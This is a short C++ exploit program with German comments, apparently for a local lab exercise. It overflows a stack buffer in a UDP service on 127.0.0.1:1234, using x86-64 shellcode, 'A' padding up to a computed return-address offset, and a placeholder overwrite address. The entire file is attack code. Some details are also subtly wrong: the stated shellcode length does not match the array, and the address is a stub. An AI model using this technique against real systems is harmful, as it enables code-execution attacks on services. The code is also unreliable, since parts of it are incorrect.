#include <arpa/inet.h>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 1234
#define PAYLOAD_SIZE 238
#define OFFSET_TO_RETURN 216 // Berechneter Offset

unsigned char shellcode[] = {
    0xb8, 0x01, 0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x48,
    0x8d, 0x35, 0x00, 0x00, 0x00, 0x00, 0xba, 0x19, 0x00, 0x00, 0x00,
    0x0f, 0x05, 0xb8, 0x3c, 0x00, 0x00, 0x00, 0x31, 0xff, 0x0f, 0x05};
unsigned int shellcode_len = 35;

int main() {
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    perror("Socket erstellen fehlgeschlagen");
    return 1;
  }

  sockaddr_in server_addr = {};
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

  char payload[PAYLOAD_SIZE];
  memset(payload, 'A', OFFSET_TO_RETURN); // Junk bis zur Rücksprungadresse

  // Shellcode in den Anfang des Buffers kopieren
  memcpy(payload, shellcode, shellcode_len);

  // Rücksprungadresse auf die Shellcode-Adresse setzen
  *(long *)(payload + OFFSET_TO_RETURN) =
      0x4141414141414141; // Adresse des Buffers

  sendto(sockfd, payload, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr,
         sizeof(server_addr));
  close(sockfd);
  return 0;
}
